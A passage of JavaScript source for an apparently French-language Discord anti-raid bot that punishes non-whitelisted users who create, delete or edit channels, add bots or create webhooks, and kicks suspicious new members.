    if (!guild.me.hasPermission("ADMINISTRATOR")) return

    let logChannel = guild.channels.cache.get(db.get(`${guild.id}.raidlog`))
    let Muted = await db.fetch(`mRole_${channel.guild.id}`);
    let muteRole = await channel.guild.roles.cache.get(Muted) || channel.guild.roles.cache.find(role => role.name === `muet`) || channel.guild.roles.cache.find(role => role.name === `Muted`) || channel.guild.roles.cache.find(role => role.name === `Mute`)
    if (muteRole) {
      await channel.createOverwrite(muteRole, {
        SEND_channelS: false,
        CONNECT: false,
        ADD_REACTIONS: false
      }, `AutoConfig`)
    } else if (db.get(`channels_${guild.id}`) === true) {
      const action = await guild.fetchAuditLogs({ limit: 1, type: "CHANNEL_CREATE" }).then(async (audit) => audit.entries.first());
      if (action.executor.id === client.user.id) return;
      let perm = guild.owner.id == action.executor.id || process.env.owner == action.executor.id || db.get(`ownermd.${action.executor.id}`) === true || db.get(`${guild.id}.${action.executor.id}.wlmd`) === true
      if (perm) {
        return
      } else if (!perm) {
        if (db.get(`sanction_${guild.id}`) === "ban") {
          guild.members.cache.get(action.executor.id).ban(`Antichannel`).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **ban** ${lang.logsr} \`${lang.logschannelc}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **ban** ${action.executor} ${lang.logsr} \`${lang.logschannelc}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })

        } else if (db.get(`sanction_${guild.id}`) === "kick") {
          guild.members.cache.get(action.executor.id).kick({
            reason: `Antichannel`
          }).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **kick** ${lang.logsr} \`${lang.logschannelc}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **kick** ${action.executor} ${lang.logsr} \`${lang.logschannelc}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })


        } else if (db.get(`sanction_${guild.id}`) === "derank" || null) {

          guild.members.cache.get(action.executor.id).roles.set([], `Antichannel`).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **derank** ${lang.logsr} \`${lang.logschannelc}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **derank** ${action.executor} ${lang.logsr} \`${lang.logschannelc}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })

        }
        channel.delete(`Antichannel`).catch(err => { })


      } else { }
    } else if (db.get(`channels_${guild.id}`) === true || "max") {
      const action = await guild.fetchAuditLogs({ limit: 1, type: "CHANNEL_CREATE" }).then(async (audit) => audit.entries.first());
      if (action.executor.id === client.user.id) return;
      let perm = guild.owner.id == action.executor.id || process.env.owner == action.executor.id || db.get(`ownermd.${action.executor.id}`) === true
      if (perm) {
        return
      } else if (!perm) {
        if (db.get(`sanction_${guild.id}`) === "ban") {
          guild.members.cache.get(action.executor.id).ban({
            reason: `Antichannel`
          }).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **ban** ${lang.logsr} \`${lang.logschannelc}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **ban** ${action.executor} ${lang.logsr} \`${lang.logschannelc}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })

        } else if (db.get(`sanction_${guild.id}`) === "kick") {
          guild.members.cache.get(action.executor.id).kick({
            reason: `Antichannel`
          }).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **kick** ${lang.logsr} \`${lang.logschannelc}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **kick** ${action.executor} ${lang.logsr} \`${lang.logschannelc}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })


        } else if (db.get(`sanction_${guild.id}`) === "derank" || null) {

          guild.members.cache.get(action.executor.id).roles.set([], `Antichannel`).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **derank** ${lang.logsr} \`${lang.logschannelc}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **derank** ${action.executor} ${lang.logsr} \`${lang.logschannelc}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })

        }
        channel.delete(`Antichannel`).catch(err => { })


      } else { }
    }
  })
  client.on("channelDelete", async (channel) => {
    let color = db.get(` ${process.env.owner}.color`)
    if (color === null) color = process.env.color
    let guild = channel.guild
    if (!guild.me.hasPermission("ADMINISTRATOR")) return

    let logChannel = guild.channels.cache.get(db.get(`${guild.id}.raidlog`))
    if (db.get(`channels_${guild.id}`) === true) {
      const action = await guild.fetchAuditLogs({ limit: 1, type: "CHANNEL_DELETE" }).then(async (audit) => audit.entries.first());
      if (action.executor.id === client.user.id) return;
      let perm = guild.owner.id == action.executor.id || process.env.owner == action.executor.id || db.get(`ownermd.${action.executor.id}`) === true || db.get(`${guild.id}.${action.executor.id}.wlmd`) === true
      if (perm) {
        return
      } else if (!perm) {
        if (db.get(`sanction_${guild.id}`) === "ban") {
          guild.members.cache.get(action.executor.id).ban(`Antichannel`).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **ban** ${lang.logsr} \`${lang.logschanneld} ${channel.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **ban** ${action.executor} ${lang.logsr} \`${lang.logschanneld} ${channel.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })

        } else if (db.get(`sanction_${guild.id}`) === "kick") {
          guild.members.cache.get(action.executor.id).kick({
            reason: `Antichannel`
          }).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **kick** ${lang.logsr} \`${lang.logschanneld} ${channel.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **kick** ${action.executor} ${lang.logsr} \`${lang.logschanneld} ${channel.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })


        } else if (db.get(`sanction_${guild.id}`) === "derank" || null) {

          guild.members.cache.get(action.executor.id).roles.set([], `Antichannel`).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **derank** ${lang.logsr} \`${lang.logschanneld} ${channel.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **derank** ${action.executor} ${lang.logsr} \`${lang.logschanneld} ${channel.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })

        }
        try {
          await channel.clone({
            name: channel.name,
            permissions: channel.permissionsOverwrites,
            type: channel.type,
            topic: channel.withTopic,
            nsfw: channel.nsfw,
            birate: channel.bitrate,
            userLimit: channel.userLimit,
            rateLimitPerMembre: channel.rateLimitPerUser,
            permissions: channel.withPermissions,
            position: channel.rawPosition,
            reason: `Antichannel`
          })
        } catch (error) {
          return;
        }

      } else { }
    } else if (db.get(`channels_${guild.id}`) === "max") {
      const action = await guild.fetchAuditLogs({ limit: 1, type: "CHANNEL_DELETE" }).then(async (audit) => audit.entries.first());
      if (action.executor.id === client.user.id) return;
      let perm = guild.owner.id == action.executor.id || process.env.owner == action.executor.id || db.get(`ownermd.${action.executor.id}`) === true
      if (perm) {
        return
      } else if (!perm) {
        if (db.get(`sanction_${guild.id}`) === "ban") {
          guild.members.cache.get(action.executor.id).ban({
            reason: `Antichannel`
          }).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **ban** ${lang.logsr} \`${lang.logschanneld} ${channel.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **ban** ${action.executor} ${lang.logsr} \`${lang.logschanneld} ${channel.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })

        } else if (db.get(`sanction_${guild.id}`) === "kick") {
          guild.members.cache.get(action.executor.id).kick({
            reason: `Antichannel`
          }).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **kick** ${lang.logsr} \`${lang.logschanneld} ${channel.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **kick** ${action.executor} ${lang.logsr} \`${lang.logschanneld} ${channel.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })


        } else if (db.get(`sanction_${guild.id}`) === "derank" || null) {

          guild.members.cache.get(action.executor.id).roles.set([], `Antichannel`).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **derank** ${lang.logsr} \`${lang.logschanneld} ${channel.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **derank** ${action.executor} ${lang.logsr} \`${lang.logschanneld} ${channel.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })

        }
        try {
          await channel.clone({
            name: channel.name,
            permissions: channel.permissionsOverwrites,
            type: channel.type,
            topic: channel.withTopic,
            nsfw: channel.nsfw,
            birate: channel.bitrate,
            userLimit: channel.userLimit,
            rateLimitPerMembre: channel.rateLimitPerUser,
            permissions: channel.withPermissions,
            position: channel.rawPosition,
            reason: `Antichannel`
          })
        } catch (error) {
          return;
        }

      } else { }
    }
  })
  
    client.on("channelUpdate", async (oldChannel, newChannel) => {
    if (oldChannel === newChannel) return

    let color = db.get(` ${process.env.owner}.color`)
    if (color === null) color = process.env.color
    let guild = oldChannel.guild
    if (!guild.me.hasPermission("ADMINISTRATOR")) return

    let logChannel = guild.channels.cache.get(db.get(`${guild.id}.raidlog`))
    if (db.get(`channels_${guild.id}`) === true) {
      const action = await guild.fetchAuditLogs({ limit: 1, type: "CHANNEL_UPDATE" }).then(async (audit) => audit.entries.first());
      if (action.executor.id === client.user.id) return;
      let perm = guild.owner.id == action.executor.id || process.env.owner == action.executor.id || db.get(`ownermd.${action.executor.id}`) === true || db.get(`${guild.id}.${action.executor.id}.wlmd`) === true
      if (perm) {
        return
      } else if (!perm) {
        if (db.get(`sanction_${guild.id}`) === "ban") {
          guild.members.cache.get(action.executor.id).ban(`Antichannel`).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **ban** ${lang.logsr} \`${lang.logschannelm} ${oldChannel.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **ban** ${action.executor} ${lang.logsr} \`${lang.logschannelm} ${oldChannel.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })

        } else if (db.get(`sanction_${guild.id}`) === "kick") {
          guild.members.cache.get(action.executor.id).kick(`Antichannel`).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **kick** ${lang.logsr} \`${lang.logschannelm} ${oldChannel.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **kick** ${action.executor} ${lang.logsr} \`${lang.logschannelm} ${oldChannel.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })


        } else if (db.get(`sanction_${guild.id}`) === "derank" || null) {

          guild.members.cache.get(action.executor.id).roles.set([], `Antichannel`).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **derank** ${lang.logsr} \`${lang.logschannelm} ${oldChannel.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **derank** ${action.executor} ${lang.logsr} \`${lang.logschannelm} ${oldChannel.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })

        }
        try {
          newChannel.edit({
            name: oldChannel.name,
            permissions: oldChannel.permissionsOverwrites,
            type: oldChannel.type,
            topic: oldChannel.withTopic,
            nsfw: oldChannel.nsfw,
            bitrate: oldChannel.bitrate,
            userLimi: oldChannel.userLimit,
            rateLlimitPerMembre: oldChannel.rateLimitPerUser,
            permissions: oldChannel.withPermissions,
            position: oldChannel.rawPosition,
            reason: `Antichannel`
          })

        } catch (err) { }

      } else { }
    } else if (db.get(`channels_${guild.id}`) === "max") {
      const action = await guild.fetchAuditLogs({ limit: 1, type: "CHANNEL_UPDATE" }).then(async (audit) => audit.entries.first());
      if (action.executor.id === client.user.id) return;
      let perm = guild.owner.id == action.executor.id || process.env.owner == action.executor.id || db.get(`ownermd.${action.executor.id}`) === true
      if (perm) {
        return
      } else if (!perm) {
        if (db.get(`sanction_${guild.id}`) === "ban") {
          guild.members.cache.get(action.executor.id).ban(`Antichannel`).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **ban** ${lang.logsr} \`${lang.logschannelm} ${oldChannel.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **ban** ${action.executor} ${lang.logsr} \`${lang.logschannelm} ${oldChannel.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })

        } else if (db.get(`sanction_${guild.id}`) === "kick") {
          guild.members.cache.get(action.executor.id).kick(`Antichannel`).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **kick** ${lang.logsr} \`${lang.logschannelm} ${oldChannel.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **kick** ${action.executor} ${lang.logsr} \`${lang.logschannelm} ${oldChannel.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })


        } else if (db.get(`sanction_${guild.id}`) === "derank" || null) {

          guild.members.cache.get(action.executor.id).roles.set([], `Antichannel`).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **derank** ${lang.logsr} \`${lang.logschannelm} ${oldChannel.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **derank** ${action.executor} ${lang.logsr} \`${lang.logschannelm} ${oldChannel.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })

        }
        try {
          newChannel.edit({
            name: oldChannel.name,
            permissions: oldChannel.permissionsOverwrites,
            type: oldChannel.type,
            topic: oldChannel.withTopic,
            nsfw: oldChannel.nsfw,
            bitrate: oldChannel.bitrate,
            userLimi: oldChannel.userLimit,
            rateLlimitPerMembre: oldChannel.rateLimitPerUser,
            permissions: oldChannel.withPermissions,
            position: oldChannel.rawPosition,
            reason: `Antichannel`
          })

        } catch (err) { }

      } else { }
    }
  })
  client.on("guildMemberAdd", async (member) => {
    let color = db.get(` ${process.env.owner}.color`)
    if (color === null) color = process.env.color
    let logChannel = member.guild.channels.cache.get(db.get(`${member.guild.id}.raidlog`))
    let logChannel2 = member.guild.channels.cache.get(db.get(`${member.guild.id}.raidlog`))

    if (db.get(`crealimit_${member.guild.id}`)) {
      const ms = require("ms");
      const duration = ms(db.get(`crealimit_${member.guild.id}`).replace("j", "d"));
      let created = member.user.createdTimestamp;
      let sum = created + duration;
      let diff = Date.now() - sum;

      if (diff < 0) {

        member.kick().then(() => {
          const embed = new Discord.MessageEmbed()
            .setColor(color)
            .setDescription(`${member} ${lang.crealogs}`)
          if (logChannel) logChannel.send(embed)
        }).catch(err => { })


      }

    } else if (db.get(`antitoken_${member.guild.id}`) === "lock") {
      member.kick()
      const embed = new Discord.MessageEmbed()
        .setColor(color)
        .setDescription(`${member} à été **kick** pour avoir \`rejoint pendant que le serveur était verrouillé\``)
      if (logChannel) logChannel.send({ embed: embed })

    } else if (db.get(`antitoken_${member.guild.id}`) === true) {
      const guild = member.guild

      let maxMembers = "10";
      let maxTime = "180000";
      let last10Members = guild.members.cache.filter(m => m.joinedAt <= (Date.now() - maxTime))
      if (last10Members.size > maxMembers) return;
      console.log(last10Members.map(r => r.user.tag))
      last10Members.forEach(m => {
        m.kick({ reason: "Anti token" }).then(() => {
          const embed = new Discord.MessageEmbed()
            .setColor(color)
            .setDescription(`${m} ${lang.antitokenlogs}`)
          if (logChannel) logChannel.send({ embed: embed })
        }).catch(err => { })
      })

    } else if (member.user.bot) {

      if (db.get(`bot_${member.guild.id}`) === "max") {
        const action = await member.guild.fetchAuditLogs({ limit: 1, type: "BOT_ADD" }).then(async (audit) => audit.entries.first());
        if (action.executor.id === client.user.id) return;
        let perm = member.guild.owner.id == action.executor.id || process.env.owner == action.executor.id || db.get(`ownermd_${member.guild.id}_${action.executor.id}`) === true
        if (perm) {
          const B4 = new MessageButton()
            .setStyle('red')
            .setID('kick')
            .setLabel('Expulser')


          const interactiveButtons = new MessageActionRow()

            .addComponent(B4)
          const constembed = new Discord.MessageEmbed()
          constembed.setDescription(`${action.executor.username} vient d'inviter le bot ${member} (${member.id})`)
          constembed.setColor(color)

          if (logChannel) logChannel.send({ components: [interactiveButtons], embed: constembed }).then(async m => {


            client.on('clickButton', async (button) => {
              if (member.guild.owner.id == button.clicker.user.id || process.env.owner == button.clicker.user.id || db.get(`${button.clicker.user.id}.ownermd`) === true) {

                if (button.id === "kick") {
                  member.kick().then(() => {
                    const embed = new Discord.MessageEmbed()
                    embed.setDescription(`Le bot ${member.username} a bien été expulsé par ${action.executor.username}`)
                    embed.setColor(color)


                    if (logChannel) logChannel.send({ embed: embed })
                  }).catch(err => {

                    if (logChannel) logChannel.send(`Il semblerait que je n'ai pas les permissions nécessaire pour **kick** ce bot`)
                  })
                  button.reply.defer(true);
                }
              }
            })
          })

        } else if (!perm) {
          if (db.get(`sanction_${member.guild.id}`) === "ban") {
            member.guild.members.cache.get(action.executor.id).ban(`Antibot`).then(te => {
              const embed = new Discord.MessageEmbed()
              embed.setDescription(`${action.executor} ${lang.logsyes} **ban** ${lang.logsr} \`${lang.botlog} ${member.tag}\``)
              embed.setColor(color)



              if (logChannel) logChannel.send({ embed: embed })
            }).catch(err => {
              const embed = new Discord.MessageEmbed()
              embed.setDescription(`${lang.logserror} **ban** ${action.executor} ${lang.logsr} \`${lang.botlog} ${member.tag}\``)
              embed.setColor(color)



              if (logChannel) logChannel.send({ embed: embed })
            })

          } else if (db.get(`sanction_${member.guild.id}`) === "kick") {
            member.guild.members.cache.get(action.executor.id).kick(`Antibot`).then(te => {
              const embed = new Discord.MessageEmbed()
              embed.setDescription(`${action.executor} ${lang.logsyes} **kick** ${lang.logsr} \`${lang.botlog} ${member.tag}\``)
              embed.setColor(color)



              if (logChannel) logChannel.send({ embed: embed })
            }).catch(err => {
              const embed = new Discord.MessageEmbed()
              embed.setDescription(`${lang.logserror} **kick** ${action.executor} ${lang.logsr} \`${lang.botlog} ${member.tag}\``)
              embed.setColor(color)



              if (logChannel) logChannel.send({ embed: embed })
            })


          } else if (db.get(`sanction_${member.guild.id}`) === "derank" || null) {

            member.guild.members.cache.get(action.executor.id).roles.remove(member.guild.members.cache.get(action.executor.id).roles.cache.array(), `Antibot`).then(te => {
              const embed = new Discord.MessageEmbed()
              embed.setDescription(`${action.executor} ${lang.logsyes} **derank** ${lang.logsr} \`${lang.botlog} ${member.tag}\``)
              embed.setColor(color)



              if (logChannel) logChannel.send({ embed: embed })
            }).catch(err => {
              const embed = new Discord.MessageEmbed()
              embed.setDescription(`${lang.logserror} **derank** ${action.executor} ${lang.logsr} \`${lang.botlog} ${member.tag}\``)
              embed.setColor(color)



              if (logChannel) logChannel.send({ embed: embed })
            })

          }
          try {
            member.kick("Antibot")
          } catch (err) { }

        } else { }
      } else if (db.get(`bot_${member.guild.id}`) === true) {
        const action = await member.guild.fetchAuditLogs({ limit: 1, type: "BOT_ADD" }).then(async (audit) => audit.entries.first());
        if (action.executor.id === client.user.id) return;
        let perm = member.guild.owner.id == action.executor.id || process.env.owner == action.executor.id || db.get(`ownermd_${member.guild.id}_${action.executor.id}`) === true || db.get(`wlmd_${member.guild.id}_${action.executor.id}`) === true
        if (perm) {
          const B4 = new MessageButton()
            .setStyle('red')
            .setID('kick')
            .setLabel('Expulser')


          const interactiveButtons = new MessageActionRow()

            .addComponent(B4)
          const constembed = new Discord.MessageEmbed()
          constembed.setDescription(`${action.executor.username} vient d'inviter le bot ${member} (${member.id})`)
          constembed.setColor(color)

          if (logChannel) logChannel.send({ components: [interactiveButtons], embed: constembed }).then(async m => {


            client.on('clickButton', async (button) => {
              if (member.guild.owner.id == button.clicker.user.id || process.env.owner == button.clicker.user.id || db.get(`${button.clicker.user.id}.ownermd`) === true) {

                if (button.id === "kick") {
                  member.kick().then(() => {
                    const embed = new Discord.MessageEmbed()
                    embed.setDescription(`Le bot ${member.username} a bien été expulsé par ${action.executor.username}`)
                    embed.setColor(color)


                    if (logChannel) logChannel.send({ embed: embed })
                  }).catch(err => {

                    if (logChannel) logChannel.send(`Il semblerait que je n'ai pas les permissions nécessaire pour **kick** ce bot`)
                  })
                  button.reply.defer(true);
                }
              }
            })
          })


        } else if (!perm) {
          if (db.get(`sanction_${member.guild.id}`) === "ban") {
            member.guild.members.cache.get(action.executor.id).ban(`Antibot`).then(te => {
              const embed = new Discord.MessageEmbed()
              embed.setDescription(`${action.executor} ${lang.logsyes} **ban** ${lang.logsr} \`${lang.botlog} ${member.tag}\``)
              embed.setColor(color)



              if (logChannel) logChannel.send({ embed: embed })
            }).catch(err => {
              const embed = new Discord.MessageEmbed()
              embed.setDescription(`${lang.logserror} **ban** ${action.executor} ${lang.logsr} \`${lang.botlog} ${member.tag}\``)
              embed.setColor(color)



              if (logChannel) logChannel.send({ embed: embed })
            })

          } else if (db.get(`sanction_${member.guild.id}`) === "kick") {
            member.guild.members.cache.get(action.executor.id).kick(`Antibot`).then(te => {
              const embed = new Discord.MessageEmbed()
              embed.setDescription(`${action.executor} ${lang.logsyes} **kick** ${lang.logsr} \`${lang.botlog} ${member.tag}\``)
              embed.setColor(color)



              if (logChannel) logChannel.send({ embed: embed })
            }).catch(err => {
              const embed = new Discord.MessageEmbed()
              embed.setDescription(`${lang.logserror} **kick** ${action.executor} ${lang.logsr} \`${lang.botlog} ${member.tag}\``)
              embed.setColor(color)



              if (logChannel) logChannel.send({ embed: embed })
            })


          } else if (db.get(`sanction_${member.guild.id}`) === "derank" || null) {

            member.guild.members.cache.get(action.executor.id).roles.remove(member.guild.members.cache.get(action.executor.id).roles.cache.array(), `Antibot`).then(te => {
              const embed = new Discord.MessageEmbed()
              embed.setDescription(`${action.executor} ${lang.logsyes} **derank** ${lang.logsr} \`${lang.botlog} ${member.tag}\``)
              embed.setColor(color)



              if (logChannel) logChannel.send({ embed: embed })
            }).catch(err => {
              const embed = new Discord.MessageEmbed()
              embed.setDescription(`${lang.logserror} **derank** ${action.executor} ${lang.logsr} \`${lang.botlog} ${member.tag}\``)
              embed.setColor(color)



              if (logChannel) logChannel.send({ embed: embed })
            })

          }
          try {
            member.kick("Antibot")
          } catch (err) { }

        } else { }
      } else { }
    }
  })
  client.on("webhookUpdate", async (channel) => {
    let color = db.get(` ${process.env.owner}.color`)
    if (color === null) color = process.env.color
    let guild = channel.guild
    if (!guild.me.hasPermission("ADMINISTRATOR")) return

    let logChannel = guild.channels.cache.get(db.get(`${guild.id}.raidlog`))

    if (db.get(`webhooks_${guild.id}`) === true) {
      const action = await guild.fetchAuditLogs({ limit: 1, type: "WEBHOOK_CREATE" }).then(async (audit) => audit.entries.first());
      if (action.executor.id === client.user.id) return;
      let perm = guild.owner.id == action.executor.id || process.env.owner == action.executor.id || db.get(`ownermd.${action.executor.id}`) === true || db.get(`${guild.id}.${action.executor.id}.wlmd`) === true
      if (perm) {
        return
      } else if (!perm) {
        if (db.get(`sanction_${guild.id}`) === "ban") {
          guild.members.cache.get(action.executor.id).ban(`Antiwebhook`).then(te => {
            const channels = channel.guild.channels.cache.filter(ch => ch.type !== 'category');
            channels.forEach(async channele => {
              await channele.clone({
                name: channele.name,
                permissions: channele.permissionsOverwrites,
                type: channele.type,
                topic: channele.withTopic,
                nsfw: channele.nsfw,
                birate: channele.bitrate,
                userLimit: channele.userLimit,
                rateLimitPerMembre: channele.rateLimitPerUser,
                permissions: channele.withPermissions,
                position: channele.rawPosition,
                reason: `Antiwebhook`
              })
                .catch(err => { })
              channele.delete().catch(err => { })
            })
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **ban** ${lang.logsr} \`${lang.logswebhook}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const channels = channel.guild.channels.cache.filter(ch => ch.type !== 'category');
            channels.forEach(async channele => {
              await channele.clone({
                name: channele.name,
                permissions: channele.permissionsOverwrites,
                type: channele.type,
                topic: channele.withTopic,
                nsfw: channele.nsfw,
                birate: channele.bitrate,
                userLimit: channele.userLimit,
                rateLimitPerMembre: channele.rateLimitPerUser,
                permissions: channele.withPermissions,
                position: channele.rawPosition,
                reason: `Antiwebhook`
              })
                .catch(err => { })
              channele.delete().catch(err => { })
            })
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **ban** ${action.executor} ${lang.logsr} \`${lang.logswebhook}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })

        } else if (db.get(`sanction_${guild.id}`) === "kick") {
          guild.members.cache.get(action.executor.id).kick(`Antiwebhook`).then(te => {
            const channels = channel.guild.channels.cache.filter(ch => ch.type !== 'category');
            channels.forEach(async channele => {
              await channele.clone({
                name: channele.name,
                permissions: channele.permissionsOverwrites,
                type: channele.type,
                topic: channele.withTopic,
                nsfw: channele.nsfw,
                birate: channele.bitrate,
                userLimit: channele.userLimit,
                rateLimitPerMembre: channele.rateLimitPerUser,
                permissions: channele.withPermissions,
                position: channele.rawPosition,
                reason: `Antiwebhook`
              })
                .catch(err => { })
              channele.delete().catch(err => { })
            })
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **kick** ${lang.logsr} \`${lang.logswebhook}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const channels = channel.guild.channels.cache.filter(ch => ch.type !== 'category');
            channels.forEach(async channele => {
              await channele.clone({
                name: channele.name,
                permissions: channele.permissionsOverwrites,
                type: channele.type,
                topic: channele.withTopic,
                nsfw: channele.nsfw,
                birate: channele.bitrate,
                userLimit: channele.userLimit,
                rateLimitPerMembre: channele.rateLimitPerUser,
                permissions: channele.withPermissions,
                position: channele.rawPosition,
                reason: `Antiwebhook`
              })
                .catch(err => { })
              channele.delete().catch(err => { })
            })
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **kick** ${action.executor} ${lang.logsr} \`${lang.logswebhook}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })


        } else if (db.get(`sanction_${guild.id}`) === "derank" || null) {

          guild.members.cache.get(action.executor.id).roles.set([], `Antiwebhook`).then(te => {
            const channels = channel.guild.channels.cache.filter(ch => ch.type !== 'category');
            channels.forEach(async channele => {
              await channele.clone({
                name: channele.name,
                permissions: channele.permissionsOverwrites,
                type: channele.type,
                topic: channele.withTopic,
                nsfw: channele.nsfw,
                birate: channele.bitrate,
                userLimit: channele.userLimit,
                rateLimitPerMembre: channele.rateLimitPerUser,
                permissions: channele.withPermissions,
                position: channele.rawPosition,
                reason: `Antiwebhook`
              })
                .catch(err => { })
              channele.delete().catch(err => { })
            })
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **derank** ${lang.logsr} \`${lang.logswebhook}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const channels = channel.guild.channels.cache.filter(ch => ch.type !== 'category');
            channels.forEach(async channele => {
              await channele.clone({
                name: channele.name,
                permissions: channele.permissionsOverwrites,
                type: channele.type,
                topic: channele.withTopic,
                nsfw: channele.nsfw,
                birate: channele.bitrate,
                userLimit: channele.userLimit,
                rateLimitPerMembre: channele.rateLimitPerUser,
                permissions: channele.withPermissions,
                position: channele.rawPosition,
